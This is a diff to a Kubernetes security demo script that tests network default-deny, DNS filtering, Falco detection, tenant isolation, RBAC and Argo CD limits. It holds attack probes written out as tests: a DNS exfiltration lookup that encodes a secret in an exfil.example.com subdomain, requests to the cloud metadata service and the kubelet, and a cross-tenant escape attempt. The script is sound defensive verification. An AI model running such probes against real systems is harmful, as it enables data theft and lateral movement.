@@ -61,7 +61,7 @@ kubectl patch application demo-escape -n argocd --type merge -p '{"operation":{"
 run kubectl get application demo-escape -n argocd -o jsonpath="'{.status.operationState.phase}: {.status.operationState.message}'"
 kubectl delete -f /tmp/demo-escape-app.yaml >/dev/null
 
-section "4. Network (Cilium default-deny, L7, FQDN, metadata/kubelet deny, WireGuard)" "Allowed flows work, everything else is dropped and visible in Hubble."
+section "4. Network (Cilium default-deny, L7, FQDN, DNS, metadata/kubelet deny, WireGuard)" "Allowed flows work, everything else is dropped and visible in Hubble."
 WORKER_IP="${IPS[1]}"
 run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 http://backend:9898/version
 run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 --post-data=x http://backend:9898/echo
@@ -70,17 +70,38 @@ run kubectl exec -n demo deploy/backend -- wget -qO- -T 5 https://example.com
 run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 https://api.github.com/zen
 run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 http://169.254.169.254/
 run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 --no-check-certificate "https://$WORKER_IP:10250/pods"
+# DNS exfiltration: data hidden in a lookup for an attacker's domain. Cilium's DNS proxy refuses unknown names.
+run kubectl exec -n demo deploy/backend -- nslookup -timeout=3 c2VjcmV0.exfil.example.com
+# Secure by default (policies/default-deny-all.yaml): a pod in "default" gets no network at all.
+cat <<'EOF' | kubectl apply -f - >/dev/null
+apiVersion: v1
+kind: Pod
+metadata: { name: api-probe, namespace: default }
+spec:
+  automountServiceAccountToken: false
+  securityContext: { runAsNonRoot: true, runAsUser: 10001, seccompProfile: { type: RuntimeDefault } }
+  containers:
+    - name: app
+      image: ghcr.io/stefanprodan/podinfo:6.8.0@sha256:6c1975b871efb327528c84d46d38e6dd7906eecee6402bc270eeb7f1b1a506df
+      command: [sleep, "300"]
+      securityContext: { allowPrivilegeEscalation: false, readOnlyRootFilesystem: true, capabilities: { drop: [ALL] } }
+      resources: { limits: { cpu: 100m, memory: 64Mi } }
+EOF
+kubectl wait --for=condition=Ready pod/api-probe -n default --timeout=90s >/dev/null
+run kubectl exec -n default api-probe -- wget -qO- -T 5 --no-check-certificate https://10.43.0.1/api
+kubectl delete pod api-probe -n default --wait=false >/dev/null
 for p in $(kubectl get pods -n kube-system -l k8s-app=cilium -o name); do
-  run kubectl exec -n kube-system "$p" -c cilium-agent -- hubble observe --namespace demo --verdict DROPPED --last 20
+  run kubectl exec -n kube-system "$p" -c cilium-agent -- hubble observe --namespace demo --namespace default --verdict DROPPED --last 20
 done
 run kubectl exec -n kube-system ds/cilium -c cilium-agent -- cilium-dbg encrypt status
 
-section "5. Runtime detection (Falco)" "Interactive shell in a workload container, and a tenant pod reaching for the API server: both detected, then alerted (section 6)."
+section "5. Runtime detection (Falco)" "Interactive shell in a workload container: detected, then alerted (section 6).
+(API-server contact is also a Falco rule, but every non-platform namespace is now default-deny, so the call never connects:
+prevention in section 4 comes first, Falco is the backup if a policy is ever missing.)"
 echo "\$ kubectl exec -it -n demo deploy/frontend -- sh -c 'id; exit'" >> "$LOG"
 script -qec "kubectl exec -it -n demo deploy/frontend -- sh -c 'id; exit'" /dev/null   # script = pty, works unattended
-run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 --no-check-certificate https://kubernetes.default.svc/api
 sleep 30
-run kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --since=5m '|' grep -E "'shell was spawned|K8s API Server'" '|' grep demo '|' tail -5
+run kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --since=5m '|' grep -E "'shell was spawned|K8s API Server'" '|' grep -E "'k8s_ns_name=demo'" '|' tail -5
 
 section "6. Alerts (Prometheus)" "The attempts above fire the security alerts."
 echo ">> waiting 3 minutes for rules to evaluate"; sleep 180
@@ -112,5 +133,36 @@ for i in 0 1; do
   on "$ip" /opt/kube-bench/kube-bench --config-dir /opt/kube-bench/cfg --benchmark rke2-cis-1.9 run --targets "$targets" > "docs/kube-bench-$node.txt"
   run grep -A6 "'== Summary total =='" "docs/kube-bench-$node.txt"
 done
+
+section "10. Multi-tenancy (demo = standard tier, tenant-b = untrusted tier in gVisor)" "Tenants cannot reach, read, or reconfigure each other, and cannot loosen their own fences."
+# Sandbox: tenant-b runs on gVisor's user-space kernel, not the host kernel.
+run kubectl get pods -n tenant-b -o "'custom-columns=POD:.metadata.name,RUNTIME:.spec.runtimeClassName,NODE:.spec.nodeName'"
+run kubectl exec -n tenant-b deploy/app -- uname -r
+run kubectl exec -n demo deploy/backend -- uname -r
+# Network: no path between tenants in either direction.
+run kubectl exec -n tenant-b deploy/app -- wget -qO- -T 5 http://backend.demo:9898/version
+run kubectl exec -n demo deploy/frontend -- wget -qO- -T 5 http://app.tenant-b:9898/version
+# RBAC: a tenant-b developer, impersonated.
+for c in "create deployments -n tenant-b" "get secrets -n demo" "create deployments -n demo" \
+         "delete networkpolicies -n tenant-b" "create pods/exec -n tenant-b" "patch namespace tenant-b"; do
+  run kubectl auth can-i $c --as=bob --as-group=tenant-b
+done
+# Admission: tenant-b pods must use gVisor; namespace labels (PSA level, sandbox tier) are guarded.
+run kubectl apply --dry-run=server -f tests/kyverno/resources.yaml '|' grep -E "'sandbox'"
+run kubectl label ns tenant-b platform.verda.io/sandbox- --dry-run=server
+run kubectl label ns demo pod-security.kubernetes.io/enforce=privileged --overwrite --dry-run=server
+# GitOps: tenant-b's Argo project tries to deploy into demo.
+cat <<'EOF' > /tmp/demo-crosstenant-app.yaml
+apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata: { name: tenant-b-escape, namespace: argocd }
+spec:
+  project: tenant-b
+  source: { repoURL: https://github.com/Ujjawal17/verda-k8s-hardening.git, targetRevision: main, path: apps/tenant-b }
+  destination: { server: https://kubernetes.default.svc, namespace: demo }
+EOF
+kubectl apply -f /tmp/demo-crosstenant-app.yaml >/dev/null; sleep 15
+run kubectl get application tenant-b-escape -n argocd -o jsonpath="'{.status.conditions[*].message}'"
+kubectl delete -f /tmp/demo-crosstenant-app.yaml >/dev/null
 
 echo ">> demo log written to $LOG"
